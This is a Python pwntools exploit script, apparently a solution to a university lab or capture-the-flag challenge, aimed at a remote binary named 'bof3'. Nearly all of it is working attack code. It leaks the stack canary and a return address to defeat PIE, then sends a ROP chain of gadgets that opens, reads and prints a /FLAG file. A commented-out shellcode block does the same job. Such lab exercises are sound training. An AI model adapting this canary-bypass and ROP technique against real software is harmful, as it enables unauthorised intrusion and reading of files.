#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.arch = 'amd64'
context.os = 'linux'
port = 12344

exe = './bof3'
elf = ELF(exe)
off_main = elf.symbols[b'main']
print(off_main)

r = remote('up.zoolab.org', port)

'''
code = """
.intel_syntax noprefix
jmp short str_addr
back:
pop rdi
mov rax, 2
mov rsi, 0
syscall
mov rdi, rax
mov rax, 0
mov rsi, rsp
sub rsi, 64
mov rdx, 64
syscall
mov rdx, rax
mov rax, 1
mov rdi, 1
mov rsi, rsp
sub rsi, 64
syscall
mov rax, 60
mov rdi, 0
syscall
str_addr:
call back
.asciz "/FLAG"
"""
'''

# buffer overflow to get the return address
leak_message = b'A' * (192 - 8 + 1) # try to read a full 8 bytes that contains canary
r.recvuntil(b"What's your name? ")
r.send(leak_message)
r.recvuntil(leak_message)
canary_value = r.recvuntil(b'\n').rstrip(b'\n')
tmp = int.from_bytes(canary_value[:7], byteorder='little')
print(f'canary valus is {hex(tmp)}')

canary_value = b"\x00" + canary_value[:7]

leak_message = b'A' * (144 + 8)
r.recvuntil(b"What's the room number? ")
r.send(leak_message)
r.recvuntil(leak_message)
ret_addr = r.recvuntil(b'\n').rstrip(b'\n')
ret_addr = int.from_bytes(ret_addr, byteorder='little')

# according to objdump -d bof3 | grep task, we can get the return offset is 9c7e + 5 bytes = 9c83

base_address = ret_addr - 0x9c83
print(f'base address is {hex(base_address)}')


'''
0x000000000000bc33 : pop rdi ; ret
0x0000000000066287 : pop rax ; ret
0x000000000000a7a8 : pop rsi ; ret
0x0000000000030ba6 : syscall ; ret
0x0000000000015f6e : pop rdx ; ret
0x0000000000068c15 : mov qword ptr [rsi], rax ; ret
0x00000000000697d1 : push rax ; ret
0x0000000000034e22 : push rsp ; ret

.bss is a section for uninitialized global/static variables.

'''
bss_address = 0xef200
flag_addr = base_address + bss_address
read_buffer = flag_addr + 0x40
pop_rdi_addr = base_address + 0xbc33
pop_rax_addr = base_address + 0x66287
pop_rsi_addr = base_address + 0xa7a8
pop_rdx_addr = base_address + 0x15f6e
syscall_addr = base_address + 0x30ba6
mov_rsi_rax = base_address + 0x68c15

gadget = (
    p64(pop_rsi_addr)+
    p64(flag_addr)+
    p64(pop_rax_addr)+
    p64(u32(b'FLAG'))+      # rax = "FLAG"
    p64(mov_rsi_rax)+       # [rsi] = rax

    p64(pop_rdi_addr)+
    p64(flag_addr)+
    p64(pop_rax_addr)+
    p64(2)+
    p64(pop_rsi_addr)+
    p64(0)+
    p64(syscall_addr)+

    p64(pop_rdi_addr)+      # mov rdi, rax
    p64(3)+
    p64(pop_rax_addr)+
    p64(0)+
    p64(pop_rsi_addr)+
    p64(read_buffer)+
    p64(pop_rdx_addr)+
    p64(64)+
    p64(syscall_addr)+

    p64(pop_rdi_addr)+
    p64(1)+
    p64(pop_rax_addr)+
    p64(1)+
    p64(pop_rsi_addr)+
    p64(read_buffer)+
    p64(pop_rdx_addr)+
    p64(64)+
    p64(syscall_addr)+

    p64(pop_rax_addr)+
    p64(60)+
    p64(pop_rdi_addr)+
    p64(0)+
    p64(syscall_addr)
)

leak_message = b"abcde"
r.recvuntil(b"What's the customer's name? ")
r.send(leak_message)
r.recvuntil(leak_message)

leak_message = b"A" * (48 - 8) + canary_value + b"B" * 8 + gadget
r.recvuntil(b"Leave your message: ")
r.send(leak_message)
r.recvuntil(b"Thank you!\n")

print(r.recvall())


r.interactive()

# 
# 
# ret_offset = 0x9c99 # 0x9bd3 + 0xc6
# pie_base = ret_addr - ret_offset
# msg_addr = pie_base + 0xef220
# msg_addr_bytes = msg_addr.to_bytes(8, byteorder='little')
# 
# 
# leak_message = b'A' *(0x60 + 0x8) + msg_addr_bytes
# r.recvuntil(b"What's the room number? ")
# r.send(leak_message)
# 
# 
# leak_message = b'What the fuck is lab6?'
# r.recvuntil(b"What's the customer's name? ")
# r.send(leak_message)
# 
# 
# r.recvuntil(b"Leave your message: ")
# payloads = code.encode()
# r.send(payloads)
# r.recvuntil(b"Thank you!\n")

